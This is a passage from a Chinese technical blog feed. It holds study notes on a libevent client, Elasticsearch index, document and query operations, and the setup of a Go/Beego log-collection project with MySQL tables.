class="title">NULL</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv.sin_addr.s_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line">bufferevent_socket_connect(bev,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置回调</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置读回调生效</span></span><br><span class="line"><span class="comment">//bufferevent_enable(bev,EV_READ);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件，监听用户在终端上的输入</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span>* <span class="title">ev</span> = <span class="title">event_new</span>(<span class="title">base</span>,<span class="title">STDIN_FILENO</span>,<span class="title">EV_READ</span>|<span class="title">EV_PERSIST</span>,<span class="title">read_terminal</span>,<span class="title">bev</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_client.c -o ev_client -l event</span><br></pre></td></tr></table></figure><h4 id="服务端客户端测试"><a href="#服务端客户端测试" class="headerlink" title="服务端客户端测试"></a>服务端客户端测试</h4><p><img src="/2021/11/19/浅学libevent/7.png" alt="7"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;libevent简介&quot;&gt;&lt;a href=&quot;#libevent简介&quot; class=&quot;headerlink&quot; title=&quot;libevent简介&quot;&gt;&lt;/a&gt;libevent简介&lt;/h4&gt;&lt;p&gt;&lt;code&gt;libevent&lt;/code&gt;是一个用C语言编写的轻量级的开源高
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch笔记</title>
    <link href="elssm.github.io/2021/11/16/Elasticsearch%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2021/11/16/Elasticsearch笔记/</id>
    <published>2021-11-16T06:29:54.000Z</published>
    <updated>2021-11-16T08:52:42.679Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ElasticSearch简介"><a href="#ElasticSearch简介" class="headerlink" title="ElasticSearch简介"></a>ElasticSearch简介</h4><p>Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。Elasticsearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。</p><h4 id="ElasticSearch对比MySQL"><a href="#ElasticSearch对比MySQL" class="headerlink" title="ElasticSearch对比MySQL"></a>ElasticSearch对比MySQL</h4><div class="table-container"><table><thead><tr><th>ELasticSearch</th><th>MySQL</th></tr></thead><tbody><tr><td>index</td><td>database</td></tr><tr><td>type</td><td>table</td></tr><tr><td>document</td><td>row</td></tr><tr><td>field</td><td>column</td></tr></tbody></table></div><h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><p>RESTful中文意思是表现层状态转化。</p><p>在RESTful架构中：每一个URI代表一种资源；客户端和服务器之间，传递这种资源的某种表现层；客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。通过URI指定资源，如<code>Index，Document</code>等。通过<code>Http Method</code>指明资源操作类型，如<code>GET POST PUT DELETE</code>等。</p><h4 id="索引创建"><a href="#索引创建" class="headerlink" title="索引创建"></a>索引创建</h4><p>使用postman工具创建一个名为<code>shopping</code>的索引，请求方式为<code>PUT</code></p><p><img src="/2021/11/16/Elasticsearch笔记/1.png" alt="1"></p><h4 id="索引查询"><a href="#索引查询" class="headerlink" title="索引查询"></a>索引查询</h4><h5 id="获取单个索引信息"><a href="#获取单个索引信息" class="headerlink" title="获取单个索引信息"></a>获取单个索引信息</h5><p><img src="/2021/11/16/Elasticsearch笔记/2.png" alt="2"></p><h5 id="获取全部索引信息"><a href="#获取全部索引信息" class="headerlink" title="获取全部索引信息"></a>获取全部索引信息</h5><p>请求地址后面添加<code>_cat/indices?v</code></p><p><img src="/2021/11/16/Elasticsearch笔记/3.png" alt="3"></p><h4 id="索引删除"><a href="#索引删除" class="headerlink" title="索引删除"></a>索引删除</h4><p>删除名为<code>shopping</code>的索引，请求方式为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/4.png" alt="4"></p><h4 id="创建文档"><a href="#创建文档" class="headerlink" title="创建文档"></a>创建文档</h4><p>请求方式为<code>POST</code>，请求地址为<code>http://localhost:9200/索引名/_doc</code>，请求体为<code>JSON</code>格式</p><p><img src="/2021/11/16/Elasticsearch笔记/5.png" alt="5"></p><p>由于ES自动生成的<code>id</code>不便于记忆，因此我们可以自定义id，只需要在<code>_doc</code>后写入自定义的id即可</p><p><img src="/2021/11/16/Elasticsearch笔记/6.png" alt="6"></p><h4 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h4><p>只需要将创建文档的请求方式改为<code>GET</code>即可，其中<code>_doc</code>后面的<code>1001</code>相当于主键</p><p><img src="/2021/11/16/Elasticsearch笔记/7.png" alt="7"></p><p>获取索引下的所有数据，可以在请求的索引后加<code>_search</code></p><p><img src="/2021/11/16/Elasticsearch笔记/8.png" alt="8"></p><h4 id="修改索引下的数据"><a href="#修改索引下的数据" class="headerlink" title="修改索引下的数据"></a>修改索引下的数据</h4><h5 id="全量更新"><a href="#全量更新" class="headerlink" title="全量更新"></a>全量更新</h5><p>因为全量更新的请求是满足幂等条件的，因此请求方式为<code>PUT</code>，将需要修改的内容以<code>JSON</code>格式写入请求体</p><p><img src="/2021/11/16/Elasticsearch笔记/9.png" alt="9"></p><h5 id="局部更新"><a href="#局部更新" class="headerlink" title="局部更新"></a>局部更新</h5><p>局部更新的请求不满足幂等条件，因此请求方式为<code>POST</code>，而且因为是局部更新，因此索引名后面要写<code>_update</code>而不能写<code>_doc</code></p><p><img src="/2021/11/16/Elasticsearch笔记/10.png" alt="10"></p><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>资源地址和创建时是一样的，请求方式变为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/11.png" alt="11"></p><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><h5 id="请求路径查询"><a href="#请求路径查询" class="headerlink" title="请求路径查询"></a>请求路径查询</h5><p>请求方式为<code>GET</code>，请求路径为<code>http://localhost:9200/shopping/_search?q=category:iphone13</code></p><p>该请求路径表示查询shopping索引下<code>category=iphone13</code>的所有结果</p><p><img src="/2021/11/16/Elasticsearch笔记/12.png" alt="12"></p><h5 id="请求体查询"><a href="#请求体查询" class="headerlink" title="请求体查询"></a>请求体查询</h5><p>请求体查询在请求路径只需要输入<code>http://localhost:9200/shopping/_search</code>，在请求体中添加<code>JSON</code>查询请求如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match"</span>:&#123;</span><br><span class="line">            <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/13.png" alt="13"></p><p>如果要全量查询，只需要将请求体中的<code>match</code>改为<code>match_all</code>即可</p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><p>全量查询的话数据量会很大，因此我们可以采用分页查询</p><p>请求体中添加<code>JSON</code>如下，其中<code>from</code>表示从哪一页开始，0表示第一页。size表示页的大小，即每一页有多少条数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/14.png" alt="14"></p><h4 id="查询结果数据源控制"><a href="#查询结果数据源控制" class="headerlink" title="查询结果数据源控制"></a>查询结果数据源控制</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>_source</code>表示所要展示的数据源，这里我们设置只显示<code>title</code>字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"_source"</span> : [<span class="string">"title"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/15.png" alt="15"></p><h4 id="查询结果排序"><a href="#查询结果排序" class="headerlink" title="查询结果排序"></a>查询结果排序</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>sort</code>表示所要要对数据进行排序，这里我们设置按照价格进行降序排序，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"_source"</span> : [<span class="string">"title"</span>],</span><br><span class="line">    <span class="attr">"sort"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : &#123;</span><br><span class="line">            <span class="attr">"order"</span> : <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/16.png" alt="16"></p><h4 id="多条件查询"><a href="#多条件查询" class="headerlink" title="多条件查询"></a>多条件查询</h4><h5 id="多条件同时成立"><a href="#多条件同时成立" class="headerlink" title="多条件同时成立"></a>多条件同时成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>must</code>表示多个条件必须同时成立</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"must"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/17.png" alt="17"></p><h5 id="多条件任意成立"><a href="#多条件任意成立" class="headerlink" title="多条件任意成立"></a>多条件任意成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>should</code>表示多个条件任意成立一个都行，这个时候我们会同时查出价格为5999和7999的结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"5999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/caoyifan/blog/source/_posts/Elasticsearch笔记/18.png" alt="18"></p><h4 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h4><p>请求体如下，其中<code>filter</code>表示过滤，<code>range</code>表示范围，我们选择<code>price</code>大于6000作为条件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"range"</span> : &#123;</span><br><span class="line">                    <span class="attr">"price"</span> : &#123;</span><br><span class="line">                        <span class="attr">"gt"</span> : <span class="number">6000</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/19.png" alt="19"></p><h4 id="完全匹配"><a href="#完全匹配" class="headerlink" title="完全匹配"></a>完全匹配</h4><p>ES在进行匹配查询的时候，会对文字进行插词之后倒排索引，因此对于<code>category=华为</code>来讲，我们在<code>match</code>匹配的时候只写一个华或是一个为，ES都会匹配出<code>category=华为</code>的结果。如果我们需要完全匹配的话，需要将<code>match</code>改为<code>match_phrase</code></p><h4 id="高亮查询"><a href="#高亮查询" class="headerlink" title="高亮查询"></a>高亮查询</h4><p>请求体如下，这里我们的匹配规则是<code>category=iphone13</code>，并对<code>category</code>字段进行高亮处理</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">        <span class="attr">"match"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : <span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"highlight"</span> : &#123;</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/20.png" alt="20"></p><h4 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h4><h5 id="创建一个索引映射"><a href="#创建一个索引映射" class="headerlink" title="创建一个索引映射"></a>创建一个索引映射</h5><p>首先创建一个<code>test</code>索引</p><p><img src="/2021/11/16/Elasticsearch笔记/21.png" alt="21"></p><p>创建索引的结构信息</p><p>请求路径为<code>http://localhost:9200/test/_mapping</code>，请求方式为<code>PUT</code>，请求体如下，其中<code>properties</code>表示属性设置，<code>type=text</code>表示<code>name</code>可以分词处理，<code>index=true</code>表示<code>name</code>可以被索引查询，<code>type=keyword</code>表示<code>sex</code>不可以分词处理，必须完整匹配。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"sex"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tel"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/22.png" alt="22"></p><h5 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h5><p><img src="/2021/11/16/Elasticsearch笔记/23.png" alt="23"></p><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p>因为我们的<code>name</code>设置的是可以分词，因此我们在查询的时候对于<code>name</code>只匹配一个字也可以查询出来结果。</p><p><img src="/2021/11/16/Elasticsearch笔记/24.png" alt="24"></p><p>对于<code>sex</code>因为我们设置的是<code>keyword</code>，因此不可以分词查询。必须完全匹配。</p><p><img src="/2021/11/16/Elasticsearch笔记/25.png" alt="25"></p><p><img src="/2021/11/16/Elasticsearch笔记/26.png" alt="26"></p><p>而对于<code>tel</code>字段，因为<code>index</code>为<code>false</code>，即不可以通过索引进行查询，因此我们无法根据<code>tel</code>字段查到数据。</p><p><img src="/2021/11/16/Elasticsearch笔记/27.png" alt="27"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ElasticSearch简介&quot;&gt;&lt;a href=&quot;#ElasticSearch简介&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearch简介&quot;&gt;&lt;/a&gt;ElasticSearch简介&lt;/h4&gt;&lt;p&gt;Elasticsearch是一个基于
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Go日志收集项目流程梳理</title>
    <link href="elssm.github.io/2021/11/12/Go%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>elssm.github.io/2021/11/12/Go日志收集项目流程梳理/</id>
    <published>2021-11-12T07:10:44.000Z</published>
    <updated>2021-11-17T10:31:31.598Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>该项目主要分为三个部分，web端负责对etcd的写入以及从mysql读写数据进行展示。logAgent负责日志的收集，主要是通过tail从etcd中实时获取所要收集的日志项，然后通过sarama从相应的日志文件读取日志信息发送到Kafka。logTransfer负责从Kafka中读取日志，并将日志写入elasticsearch最后通过Kibana进行日志的检索。</p><h4 id="logBeegoWeb"><a href="#logBeegoWeb" class="headerlink" title="logBeegoWeb"></a>logBeegoWeb</h4><p>前端使用Beego框架完成。在运行项目之前，首先安装bee脚手架。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/beego/bee</span><br></pre></td></tr></table></figure><p>执行<code>bee</code>命令查看是否安装成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % bee</span><br><span class="line">Bee is a Fast and Flexible tool for managing your Beego Web Application.</span><br><span class="line"></span><br><span class="line">USAGE</span><br><span class="line">    bee command [arguments]</span><br><span class="line"></span><br><span class="line">AVAILABLE COMMANDS</span><br><span class="line"></span><br><span class="line">    version     Prints the current Bee version</span><br><span class="line">    migrate     Runs database migrations</span><br><span class="line">    api         Creates a Beego API application</span><br><span class="line">    bale        Transforms non-Go files to Go source files</span><br><span class="line">    fix         Fixes your application by making it compatible with newer versions of Beego</span><br><span class="line">    pro         Source code generator</span><br><span class="line">    dlv         Start a debugging session using Delve</span><br><span class="line">    dockerize   Generates a Dockerfile for your Beego application</span><br><span class="line">    generate    Source code generator</span><br><span class="line">    hprose      Creates an RPC application based on Hprose and Beego frameworks</span><br><span class="line">    new         Creates a Beego application</span><br><span class="line">    pack        Compresses a Beego application into a single file</span><br><span class="line">    rs          Run customized scripts</span><br><span class="line">    run         Run the application by starting a local development server</span><br><span class="line">    server      serving static content over HTTP on port</span><br><span class="line">    update      Update Bee</span><br><span class="line"></span><br><span class="line">Use bee help [command] for more information about a command.</span><br><span class="line"></span><br><span class="line">ADDITIONAL HELP TOPICS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Use bee help [topic] for more information about that topic.</span><br></pre></td></tr></table></figure><p>进入logBeegoWeb文件夹，<code>bee run</code>启动项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro logBeegoWeb % bee run</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.12.0</span><br><span class="line">2021/11/12 15:09:30 INFO     ▶ 0001 Using 'logBeegoWeb' as 'appname'</span><br><span class="line">2021/11/12 15:09:30 INFO     ▶ 0002 Initializing watcher...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  ▶ 0003 Built Successfully!</span><br><span class="line">2021/11/12 15:09:32 INFO     ▶ 0004 Restarting 'logBeegoWeb'...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  ▶ 0005 './logBeegoWeb' is running...</span><br><span class="line">2021/11/12 15:09:32.451 [I] [asm_amd64.s:1374]  http server Running on http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p>查看本地<code>8080</code>端口，项目启动成功</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/1.png" alt="1"></p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>创建数据库的sql源码如下，创建名为<code>logCollect</code> 的数据库，并创建三张表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> logCollect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_info(</span><br><span class="line">app_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_name <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">app_type <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line">develop_path <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_ip(</span><br><span class="line">app_id <span class="built_in">int</span>,</span><br><span class="line">ip <span class="built_in">varchar</span>(<span class="number">64</span>),</span><br><span class="line"><span class="keyword">Key</span> app_id_ip_index (app_id, ip)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span 